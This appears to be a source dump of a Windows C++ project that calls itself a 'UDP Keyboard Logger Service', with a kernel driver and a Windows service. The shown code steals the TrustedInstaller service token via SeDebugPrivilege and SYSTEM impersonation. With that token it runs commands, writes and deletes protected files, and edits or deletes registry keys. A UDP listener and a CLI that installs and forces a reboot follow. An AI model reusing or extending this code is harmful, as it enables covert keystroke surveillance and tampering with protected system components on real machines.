    if (ImpersonateLoggedOnUser(token.get())) {
        // Use native Windows DeleteFile API with impersonated token
        if (DeleteFileW(path.c_str())) {
            success = true;
        } else {
            DWORD error = GetLastError();
            if (error == ERROR_FILE_NOT_FOUND) {
                // File already deleted - consider it success
                success = true;
            } else {
                // Log error for debugging (optional)
                std::wcerr << L"DeleteFile failed with error: " << error << std::endl;
            }
        }
        RevertToSelf(); // Always revert to original context
    }

    return success;
}

// =============================================================================
// New Public API Methods - Direct Registry Operations
// =============================================================================

bool TrustedInstallerExecutor::ReadRegistryValueAsTrustedInstaller(
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    std::wstring& outValue) noexcept {
    
    // Enable required privileges
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    auto systemToken = GetSystemToken();
    if (!systemToken) return false;

    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) return false;

    (void)EnableAllPrivileges(tiToken);

    return ReadRegistryValueWithToken(tiToken, hKeyRoot, subKey, valueName, outValue);
}

bool TrustedInstallerExecutor::WriteRegistryValueAsTrustedInstaller(
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    const std::wstring& value) noexcept {
    
    // Enable required privileges
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    auto systemToken = GetSystemToken();
    if (!systemToken) return false;

    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) return false;

    (void)EnableAllPrivileges(tiToken);

    return WriteRegistryValueWithToken(tiToken, hKeyRoot, subKey, valueName, value);
}

bool TrustedInstallerExecutor::DeleteRegistryKeyAsTrustedInstaller(
    HKEY hKeyRoot,
    const std::wstring& subKey) noexcept {
    
    // Enable required privileges
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    auto systemToken = GetSystemToken();
    if (!systemToken) return false;

    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) return false;

    (void)EnableAllPrivileges(tiToken);

    return DeleteRegistryKeyWithToken(tiToken, hKeyRoot, subKey);
}

// =============================================================================
// New Private Methods - Registry Operations with Token
// =============================================================================

bool TrustedInstallerExecutor::ReadRegistryValueWithToken(
    const TokenHandle& token,
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    std::wstring& outValue) const noexcept {
    
    bool success = false;

    if (ImpersonateLoggedOnUser(token.get())) {
        HKEY hKey = nullptr;
        
        if (RegOpenKeyExW(hKeyRoot, subKey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            DWORD dataSize = 0;
            DWORD dataType = 0;
            
            // First call to get size
            if (RegQueryValueExW(hKey, valueName.empty() ? nullptr : valueName.c_str(), 
                               nullptr, &dataType, nullptr, &dataSize) == ERROR_SUCCESS) {
                
                if (dataType == REG_SZ || dataType == REG_EXPAND_SZ) {
                    std::vector<wchar_t> buffer(dataSize / sizeof(wchar_t) + 1);
                    
                    if (RegQueryValueExW(hKey, valueName.empty() ? nullptr : valueName.c_str(),
                                       nullptr, &dataType, 
                                       reinterpret_cast<BYTE*>(buffer.data()), 
                                       &dataSize) == ERROR_SUCCESS) {
                        outValue = buffer.data();
                        success = true;
                    }
                }
            }
            
            RegCloseKey(hKey);
        }
        
        RevertToSelf();
    }

    return success;
}

bool TrustedInstallerExecutor::WriteRegistryValueWithToken(
    const TokenHandle& token,
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    const std::wstring& value) const noexcept {
    
    bool success = false;

    if (ImpersonateLoggedOnUser(token.get())) {
        HKEY hKey = nullptr;
        
        // Open with write access
        if (RegOpenKeyExW(hKeyRoot, subKey.c_str(), 0, KEY_WRITE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            DWORD dataSize = static_cast<DWORD>((value.length() + 1) * sizeof(wchar_t));
            
            if (RegSetValueExW(hKey, valueName.empty() ? nullptr : valueName.c_str(),
                             0, REG_EXPAND_SZ, 
                             reinterpret_cast<const BYTE*>(value.c_str()), 
                             dataSize) == ERROR_SUCCESS) {
                success = true;
            }
            
            RegCloseKey(hKey);
        }
        
        RevertToSelf();
    }

    return success;
}

bool TrustedInstallerExecutor::DeleteRegistryKeyWithToken(
    const TokenHandle& token,
    HKEY hKeyRoot,
    const std::wstring& subKey) const noexcept {
    
    bool success = false;

    if (ImpersonateLoggedOnUser(token.get())) {
        if (RegDeleteTreeW(hKeyRoot, subKey.c_str()) == ERROR_SUCCESS) {
            success = true;
        }
        
        RevertToSelf();
    }

    return success;
}

// =============================================================================
// Binary Registry Operations
// =============================================================================

bool TrustedInstallerExecutor::ReadRegistryBinaryAsTrustedInstaller(
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    std::vector<BYTE>& outData) noexcept {
    
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    auto systemToken = GetSystemToken();
    if (!systemToken) return false;

    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) return false;

    (void)EnableAllPrivileges(tiToken);

    return ReadRegistryBinaryWithToken(tiToken, hKeyRoot, subKey, valueName, outData);
}

bool TrustedInstallerExecutor::WriteRegistryBinaryAsTrustedInstaller(
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    const std::vector<BYTE>& data) noexcept {
    
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    auto systemToken = GetSystemToken();
    if (!systemToken) return false;

    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) return false;

    (void)EnableAllPrivileges(tiToken);

    return WriteRegistryBinaryWithToken(tiToken, hKeyRoot, subKey, valueName, data);
}

bool TrustedInstallerExecutor::WriteRegistryDwordAsTrustedInstaller(
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    DWORD value) noexcept {
    
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    auto systemToken = GetSystemToken();
    if (!systemToken) return false;

    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) return false;

    (void)EnableAllPrivileges(tiToken);

    return WriteRegistryDwordWithToken(tiToken, hKeyRoot, subKey, valueName, value);
}

bool TrustedInstallerExecutor::WriteRegistryDwordWithToken(
    const TokenHandle& token,
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    DWORD value) const noexcept {
    
    bool success = false;

    if (ImpersonateLoggedOnUser(token.get())) {
        HKEY hKey = nullptr;
        
        if (RegOpenKeyExW(hKeyRoot, subKey.c_str(), 0, KEY_WRITE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueExW(hKey, valueName.c_str(),
                             0, REG_DWORD, 
                             reinterpret_cast<const BYTE*>(&value), 
                             sizeof(DWORD)) == ERROR_SUCCESS) {
                success = true;
            }
            
            RegCloseKey(hKey);
        }
        
        RevertToSelf();
    }

    return success;
}

bool TrustedInstallerExecutor::CreateRegistryKeyAsTrustedInstaller(
    HKEY hKeyRoot,
    const std::wstring& subKey) noexcept {
    
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        return false;
    }

    auto systemToken = GetSystemToken();
    if (!systemToken) return false;

    if (!ImpersonateLoggedOnUser(systemToken.get())) {
        return false;
    }

    auto tiPid = StartTrustedInstallerService();
    if (!tiPid) {
        RevertToSelf();
        return false;
    }

    auto tiToken = GetTrustedInstallerToken(*tiPid);
    RevertToSelf();

    if (!tiToken) return false;

    (void)EnableAllPrivileges(tiToken);

    return CreateRegistryKeyWithToken(tiToken, hKeyRoot, subKey);
}

bool TrustedInstallerExecutor::ReadRegistryBinaryWithToken(
    const TokenHandle& token,
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    std::vector<BYTE>& outData) const noexcept {
    
    bool success = false;

    if (ImpersonateLoggedOnUser(token.get())) {
        HKEY hKey = nullptr;
        
        if (RegOpenKeyExW(hKeyRoot, subKey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            DWORD dataSize = 0;
            DWORD dataType = 0;
            
            // Get size
            if (RegQueryValueExW(hKey, valueName.empty() ? nullptr : valueName.c_str(), 
                               nullptr, &dataType, nullptr, &dataSize) == ERROR_SUCCESS) {
                
                if (dataType == REG_BINARY) {
                    outData.resize(dataSize);
                    
                    if (RegQueryValueExW(hKey, valueName.empty() ? nullptr : valueName.c_str(),
                                       nullptr, &dataType, outData.data(), &dataSize) == ERROR_SUCCESS) {
                        success = true;
                    }
                }
            }
            
            RegCloseKey(hKey);
        }
        
        RevertToSelf();
    }

    return success;
}

bool TrustedInstallerExecutor::WriteRegistryBinaryWithToken(
    const TokenHandle& token,
    HKEY hKeyRoot,
    const std::wstring& subKey,
    const std::wstring& valueName,
    const std::vector<BYTE>& data) const noexcept {
    
    bool success = false;

    if (ImpersonateLoggedOnUser(token.get())) {
        HKEY hKey = nullptr;
        
        if (RegOpenKeyExW(hKeyRoot, subKey.c_str(), 0, KEY_WRITE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueExW(hKey, valueName.empty() ? nullptr : valueName.c_str(),
                             0, REG_BINARY, data.data(), static_cast<DWORD>(data.size())) == ERROR_SUCCESS) {
                success = true;
            }
            
            RegCloseKey(hKey);
        }
        
        RevertToSelf();
    }

    return success;
}

bool TrustedInstallerExecutor::CreateRegistryKeyWithToken(
    const TokenHandle& token,
    HKEY hKeyRoot,
    const std::wstring& subKey) const noexcept {
    
    bool success = false;

    if (ImpersonateLoggedOnUser(token.get())) {
        HKEY hKey = nullptr;
        DWORD disposition = 0;
        
        if (RegCreateKeyExW(hKeyRoot, subKey.c_str(), 0, nullptr, REG_OPTION_NON_VOLATILE,
                           KEY_WRITE | KEY_WOW64_64KEY, nullptr, &hKey, &disposition) == ERROR_SUCCESS) {
            success = true;
            RegCloseKey(hKey);
        }
        
        RevertToSelf();
    }

    return success;
}

// =============================================================================
// Static Helper Methods
// =============================================================================

bool TrustedInstallerExecutor::IsCurrentProcessElevated() noexcept {
    TokenHandle token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, token.address())) {
        return false;
    }

    TOKEN_ELEVATION elevation{};
    DWORD size = sizeof(elevation);
    
    return GetTokenInformation(token.get(), TokenElevation, &elevation, size, &size) &&
           elevation.TokenIsElevated;
}

std::wstring TrustedInstallerExecutor::GetCurrentUserName() noexcept {
    TokenHandle token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, token.address())) {
        return L"Unknown";
    }
    
    DWORD size = 0;
    GetTokenInformation(token.get(), TokenUser, nullptr, 0, &size);
    
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        return L"Unknown";
    }
    
    std::vector<BYTE> buffer(size);
    if (!GetTokenInformation(token.get(), TokenUser, buffer.data(), size, &size)) {
        return L"Unknown";
    }
    
    DWORD userNameLen = 0;
    DWORD domainLen = 0;
    auto tokenUser = reinterpret_cast<PTOKEN_USER>(buffer.data());
    
    SID_NAME_USE sidType;
    // First call to get required buffer sizes
    if (!LookupAccountSidW(nullptr, tokenUser->User.Sid, nullptr, &userNameLen, 
                          nullptr, &domainLen, &sidType) && 
        GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        
        std::vector<wchar_t> nameBuffer(userNameLen);
        std::vector<wchar_t> domainBuffer(domainLen);
        
        if (LookupAccountSidW(nullptr, tokenUser->User.Sid, nameBuffer.data(), &userNameLen,
                             domainBuffer.data(), &domainLen, &sidType)) {
            return std::wstring(domainBuffer.data()) + L"\\" + std::wstring(nameBuffer.data());
        }
    }
    
    return L"Unknown";
}


================================================================================
 FILE: UdpLogger\TrustedInstallerExecutor.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-09 19:19:27
 File size     : 6.99 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// TrustedInstallerExecutor.h
#pragma once
#include <windows.h>
#include <string>
#include <string_view>
#include <memory>
#include <optional>
#include <vector>
#include <array>
#include <filesystem>

// Executes operations with TrustedInstaller privileges by impersonating the TrustedInstaller service token
class TrustedInstallerExecutor {
public:
    TrustedInstallerExecutor();
    ~TrustedInstallerExecutor();

    // Delete copy operations (rule of five)
    TrustedInstallerExecutor(const TrustedInstallerExecutor&) = delete;
    TrustedInstallerExecutor& operator=(const TrustedInstallerExecutor&) = delete;
    TrustedInstallerExecutor(TrustedInstallerExecutor&&) noexcept = delete;
    TrustedInstallerExecutor& operator=(TrustedInstallerExecutor&&) noexcept = delete;

    // Command Execution
    [[nodiscard]] bool RunAsTrustedInstaller(std::wstring_view commandLine, bool showWindow = true);
    [[nodiscard]] bool RunAsTrustedInstaller(const std::filesystem::path& executablePath, 
                                           std::wstring_view arguments = L"", 
                                           bool showWindow = true);

    // File Operations
    [[nodiscard]] bool CopyFileAsTrustedInstaller(const std::wstring& source, const std::wstring& destination) noexcept;
    [[nodiscard]] bool WriteFileAsTrustedInstaller(const std::wstring& path, const std::vector<BYTE>& data) noexcept;
    [[nodiscard]] bool DeleteFileAsTrustedInstaller(const std::wstring& path) noexcept;

    // Registry Operations - String Values (REG_SZ/REG_EXPAND_SZ)
    [[nodiscard]] bool ReadRegistryValueAsTrustedInstaller(
        HKEY hKeyRoot, 
        const std::wstring& subKey, 
        const std::wstring& valueName, 
        std::wstring& outValue) noexcept;
    
    [[nodiscard]] bool WriteRegistryValueAsTrustedInstaller(
        HKEY hKeyRoot, 
        const std::wstring& subKey, 
        const std::wstring& valueName, 
        const std::wstring& value) noexcept;

    // Registry Operations - Binary Values (REG_BINARY)
    [[nodiscard]] bool ReadRegistryBinaryAsTrustedInstaller(
        HKEY hKeyRoot, 
        const std::wstring& subKey, 
        const std::wstring& valueName, 
        std::vector<BYTE>& outData) noexcept;
    
    [[nodiscard]] bool WriteRegistryBinaryAsTrustedInstaller(
        HKEY hKeyRoot, 
        const std::wstring& subKey, 
        const std::wstring& valueName, 
        const std::vector<BYTE>& data) noexcept;

    // Registry Operations - DWORD Values (REG_DWORD)
    [[nodiscard]] bool WriteRegistryDwordAsTrustedInstaller(
        HKEY hKeyRoot, 
        const std::wstring& subKey, 
        const std::wstring& valueName, 
        DWORD value) noexcept;

    // Registry Operations - Key Management
    [[nodiscard]] bool CreateRegistryKeyAsTrustedInstaller(HKEY hKeyRoot, const std::wstring& subKey) noexcept;
    [[nodiscard]] bool DeleteRegistryKeyAsTrustedInstaller(HKEY hKeyRoot, const std::wstring& subKey) noexcept;

    // Static Helper Methods
    [[nodiscard]] static bool IsCurrentProcessElevated() noexcept;
    [[nodiscard]] static std::wstring GetCurrentUserName() noexcept;

private:
    // RAII wrapper for HANDLE
    class TokenHandle {
    public:
        TokenHandle() noexcept = default;
        explicit TokenHandle(HANDLE handle) noexcept : handle_(handle) {}
        ~TokenHandle() { reset(); }
        
        TokenHandle(TokenHandle&& other) noexcept : handle_(other.release()) {}
        TokenHandle& operator=(TokenHandle&& other) noexcept;
        
        [[nodiscard]] HANDLE get() const noexcept { return handle_; }
        [[nodiscard]] HANDLE* address() noexcept { return &handle_; }
        [[nodiscard]] explicit operator bool() const noexcept { return handle_ != nullptr && handle_ != INVALID_HANDLE_VALUE; }
        void reset(HANDLE newHandle = nullptr) noexcept;
        HANDLE release() noexcept;
        
    private:
        HANDLE handle_{nullptr};
    };

    // Privileges required for TrustedInstaller operations
    static constexpr std::array<std::wstring_view, 8> REQUIRED_PRIVILEGES = {
        L"SeDebugPrivilege",
        L"SeImpersonatePrivilege",
        L"SeAssignPrimaryTokenPrivilege",
        L"SeTcbPrivilege",
        L"SeBackupPrivilege",
        L"SeRestorePrivilege",
        L"SeTakeOwnershipPrivilege",
        L"SeSecurityPrivilege"
    };

    // Core Implementation - Token and Service Management
    [[nodiscard]] bool EnableAllPrivileges(const TokenHandle& token) const noexcept;
    [[nodiscard]] bool EnablePrivilege(std::wstring_view privilegeName) const noexcept;
    [[nodiscard]] std::optional<DWORD> GetProcessIdByName(std::wstring_view processName) const noexcept;
    [[nodiscard]] TokenHandle GetSystemToken() const noexcept;
    [[nodiscard]] std::optional<DWORD> StartTrustedInstallerService() const noexcept;
    [[nodiscard]] TokenHandle GetTrustedInstallerToken(DWORD trustedInstallerPid) const noexcept;
    [[nodiscard]] bool CreateProcessWithToken(const TokenHandle& token, std::wstring_view commandLine, bool showWindow) const noexcept;

    // File Operations Implementation
    [[nodiscard]] bool CopyFileWithToken(const TokenHandle& token, const std::wstring& source, const std::wstring& destination) const noexcept;
    [[nodiscard]] bool WriteFileWithToken(const TokenHandle& token, const std::wstring& path, const std::vector<BYTE>& data) const noexcept;
    [[nodiscard]] bool DeleteFileWithToken(const TokenHandle& token, const std::wstring& path) const noexcept;

    // Registry Operations Implementation - String Values
    [[nodiscard]] bool ReadRegistryValueWithToken(const TokenHandle& token, HKEY hKeyRoot, const std::wstring& subKey, const std::wstring& valueName, std::wstring& outValue) const noexcept;
    [[nodiscard]] bool WriteRegistryValueWithToken(const TokenHandle& token, HKEY hKeyRoot, const std::wstring& subKey, const std::wstring& valueName, const std::wstring& value) const noexcept;

    // Registry Operations Implementation - Binary Values
    [[nodiscard]] bool ReadRegistryBinaryWithToken(const TokenHandle& token, HKEY hKeyRoot, const std::wstring& subKey, const std::wstring& valueName, std::vector<BYTE>& outData) const noexcept;
    [[nodiscard]] bool WriteRegistryBinaryWithToken(const TokenHandle& token, HKEY hKeyRoot, const std::wstring& subKey, const std::wstring& valueName, const std::vector<BYTE>& data) const noexcept;

    // Registry Operations Implementation - DWORD Values
    [[nodiscard]] bool WriteRegistryDwordWithToken(const TokenHandle& token, HKEY hKeyRoot, const std::wstring& subKey, const std::wstring& valueName, DWORD value) const noexcept;

    // Registry Operations Implementation - Key Management
    [[nodiscard]] bool CreateRegistryKeyWithToken(const TokenHandle& token, HKEY hKeyRoot, const std::wstring& subKey) const noexcept;
    [[nodiscard]] bool DeleteRegistryKeyWithToken(const TokenHandle& token, HKEY hKeyRoot, const std::wstring& subKey) const noexcept;

    bool comInitialized_{false};
};


================================================================================
 FILE: UdpLogger\UdpListener.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-08 14:34:04
 File size     : 5.14 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#include "UdpListener.h"
#include "config.h"
#include <iostream>
#include <stdexcept>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")

UdpListener::UdpListener(const std::string& address, int port)
    : address_(address), port_(port), socket_(INVALID_SOCKET), running_(false) {
    
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        throw std::runtime_error("WSAStartup failed: " + std::to_string(result));
    }
}

UdpListener::~UdpListener() {
    stop();
    cleanup();
    WSACleanup();
}

bool UdpListener::start() {
    if (running_) {
        return true;
    }
    
    socket_ = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (socket_ == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    
    // Allow socket reuse
    int enable = 1;
    if (setsockopt(socket_, SOL_SOCKET, SO_REUSEADDR, (char*)&enable, sizeof(enable)) == SOCKET_ERROR) {
        std::cerr << "setsockopt failed: " << WSAGetLastError() << std::endl;
    }
    
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port_);
    inet_pton(AF_INET, address_.c_str(), &serverAddr.sin_addr);
    
    if (bind(socket_, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << std::endl;
        closesocket(socket_);
        socket_ = INVALID_SOCKET;
        return false;
    }
    
    // Set socket to non-blocking mode for better shutdown handling
    u_long mode = 1; // 1 to enable non-blocking mode
    ioctlsocket(socket_, FIONBIO, &mode);
    
    running_ = true;
    listenerThread_ = std::thread(&UdpListener::run, this);
    
	// Service mode - no console output
    // std::cout << "UDP listener started on " << address_ << ":" << port_ << std::endl;
    return true;
}

void UdpListener::stop() {
    if (!running_) {
        return;
    }
    
    running_ = false;
    
    // Signal the thread to wake up
    if (socket_ != INVALID_SOCKET) {
        closesocket(socket_);
        socket_ = INVALID_SOCKET;
    }
    
    if (listenerThread_.joinable()) {
        listenerThread_.join();
    }
}

void UdpListener::setMessageHandler(MessageHandler handler) {
    messageHandler_ = std::move(handler);
}

void UdpListener::run() {
    char buffer[Config::BUFFER_SIZE];
    sockaddr_in clientAddr{};
    int clientAddrLen = sizeof(clientAddr);
	
	// Service mode - no console output
    // std::cout << "UDP listener thread started" << std::endl;
    
    while (running_) {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(socket_, &readSet);
        
        timeval timeout{};
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int result = select(0, &readSet, nullptr, nullptr, &timeout);
        
        if (result == SOCKET_ERROR) {
            if (running_) {
                std::cerr << "Select failed: " << WSAGetLastError() << std::endl;
            }
            break;
        }
        
        if (result > 0 && FD_ISSET(socket_, &readSet)) {
            int bytesReceived = recvfrom(socket_, buffer, sizeof(buffer) - 1, 0,
                                       reinterpret_cast<sockaddr*>(&clientAddr), &clientAddrLen);
            
            if (bytesReceived == SOCKET_ERROR) {
                int error = WSAGetLastError();
                if (error != WSAEWOULDBLOCK && running_) {
                    std::cerr << "recvfrom failed: " << error << std::endl;
                }
                continue;
            }
            
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0'; // Null-terminate the string
                std::string message(buffer);
                
                // Usuń znaki nowej linii i powrotu karetki
                message.erase(std::remove(message.begin(), message.end(), '\r'), message.end());
                message.erase(std::remove(message.begin(), message.end(), '\n'), message.end());
                
                if (!message.empty()) {
                    std::string clientInfo = getClientInfo(clientAddr);

                    // Service mode - no console output
                    // std::cout << "Received message from " << clientInfo << ": " << message << std::endl;
                    
                    if (messageHandler_) {
                        messageHandler_(message, clientInfo);
                    }
                }
            }
        }
    }

    // Service mode - no console output
    // std::cout << "UDP listener thread stopped" << std::endl;
}

void UdpListener::cleanup() {
    if (socket_ != INVALID_SOCKET) {
        closesocket(socket_);
        socket_ = INVALID_SOCKET;
    }
}

std::string UdpListener::getClientInfo(const sockaddr_in& clientAddr) const {
    char ipStr[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, sizeof(ipStr));
    
    return std::string(ipStr) + ":" + std::to_string(ntohs(clientAddr.sin_port));
}


================================================================================
 FILE: UdpLogger\UdpListener.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-08 12:14:30
 File size     : 0.79 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <functional>
#include <thread>
#include <atomic>

class UdpListener {
public:
    using MessageHandler = std::function<void(const std::string&, const std::string&)>;
    
    UdpListener(const std::string& address, int port);
    ~UdpListener();
    
    bool start();
    void stop();
    void setMessageHandler(MessageHandler handler);
    
private:
    void run();
    void cleanup();
    std::string getClientInfo(const sockaddr_in& clientAddr) const;
    
    std::string address_;
    int port_;
    SOCKET socket_;
    std::thread listenerThread_;
    std::atomic<bool> running_;
    MessageHandler messageHandler_;
};


================================================================================
 FILE: UdpLogger\UdpLogger.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 10:12:42
 File size     : 18.74 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <Windows.h>
#include <conio.h>
#include <iostream>
#include "UdpServiceManager.h"
#include "DriverInstaller.h"
#include "SystemStatus.h"

// Helper macros for colored output - changed names to avoid conflicts with Windows API
#define LOG_INFO(fmt, ...) wprintf(L"[INFO] " fmt L"\n", ##__VA_ARGS__)
#define LOG_SUCCESS(fmt, ...) wprintf(L"[SUCCESS] " fmt L"\n", ##__VA_ARGS__)
#define LOG_ERROR(fmt, ...) wprintf(L"[ERROR] " fmt L"\n", ##__VA_ARGS__)

// Reboot helper - uses native Windows API
bool PromptAndReboot(bool forceReboot) {
    if (!forceReboot) {
        // Flush all buffers first
        fflush(stdout);
        
        // Prompt user for confirmation
        wprintf(L"\n");
        wprintf(L"+============================================================+\n");
        wprintf(L"|  System reboot is REQUIRED for changes to take effect.     |\n");
        wprintf(L"+============================================================+\n");
        wprintf(L"\nReboot now? (Y/N): ");
        fflush(stdout);  // Force output immediately
        
        wchar_t response = _getwch();
        wprintf(L"%c\n", response);
        
        if (response != L'Y' && response != L'y') {
            wprintf(L"\nReboot skipped. Please restart manually for changes to take effect.\n");
            return false;
        }
    }
    
    // Enable shutdown privilege
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LOG_ERROR(L"Failed to open process token for reboot");
        return false;
    }
    
    TOKEN_PRIVILEGES tkp;
    LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);
    CloseHandle(hToken);
    
    // Initiate system shutdown with 10 second delay
    std::wcout << L"\n";
    LOG_INFO(L"Initiating system reboot in 10 seconds...");
    
    // Prepare shutdown message (LPWSTR requires non-const)
    wchar_t shutdownMessage[] = L"System restart required for driver installation.";
    
    if (!InitiateSystemShutdownExW(
            nullptr,                                    // Local machine
            shutdownMessage,                            // Non-const message
            10,                                         // 10 second timeout
            TRUE,                                       // Force apps closed
            TRUE,                                       // Reboot after shutdown
            SHTDN_REASON_MAJOR_APPLICATION |            // Application installation
            SHTDN_REASON_MINOR_INSTALLATION |
            SHTDN_REASON_FLAG_PLANNED)) {
        
        LOG_ERROR(L"Failed to initiate system reboot (error: %d)", GetLastError());
        return false;
    }
    
    LOG_SUCCESS(L"System reboot initiated");
    return true;
}

void PrintUsage() {
    std::wcout << L"\n=== UDP Keyboard Logger Service ===" << std::endl;
    std::wcout << L"Built with C++20\n" << std::endl;
    std::wcout << L"Usage:" << std::endl;
    std::wcout << L"  UdpLogger install              # Install service (will prompt for reboot)" << std::endl;
    std::wcout << L"  UdpLogger install --reboot     # Install service and reboot immediately" << std::endl;
    std::wcout << L"  UdpLogger uninstall            # Uninstall service (reboot recommended)" << std::endl;
    std::wcout << L"  UdpLogger status               # Full system status check" << std::endl;
    std::wcout << L"  UdpLogger service start        # Start Windows service" << std::endl;
    std::wcout << L"  UdpLogger service stop         # Stop Windows service" << std::endl;
    std::wcout << L"  UdpLogger service restart      # Restart Windows service" << std::endl;
    std::wcout << L"  UdpLogger service status       # Check Windows service status" << std::endl;
    std::wcout << L"  UdpLogger driver start         # Start kernel driver" << std::endl;
    std::wcout << L"  UdpLogger driver stop          # Stop kernel driver" << std::endl;
    std::wcout << L"  UdpLogger driver restart       # Restart kernel driver" << std::endl;
    std::wcout << L"  UdpLogger driver status        # Check kernel driver status" << std::endl;
    
#if DEBUG_LOGGING_ENABLED
    std::wcout << L"\n--- Developer/Debug Commands ---" << std::endl;
    std::wcout << L"  UdpLogger --service            # Run as service (internal use)" << std::endl;
    std::wcout << L"  UdpLogger driver-install       # Install driver and library" << std::endl;
    std::wcout << L"  UdpLogger driver-uninstall     # Uninstall driver and library" << std::endl;
#endif
    
    std::wcout << std::endl;
}

int wmain(int argc, wchar_t* argv[]) {
    // Check for --service flag (running as Windows service)
    if (argc >= 2 && wcscmp(argv[1], L"--service") == 0) {
        return UdpServiceManager::RunAsService();
    }
    
    // Interactive mode - require at least one command
    if (argc < 2) {
        PrintUsage();
        return 1;
    }
    
    std::wstring command = argv[1];
    
    // ====================================================================
    // DRIVER/LIBRARY INSTALLATION COMMANDS
    // ====================================================================
    
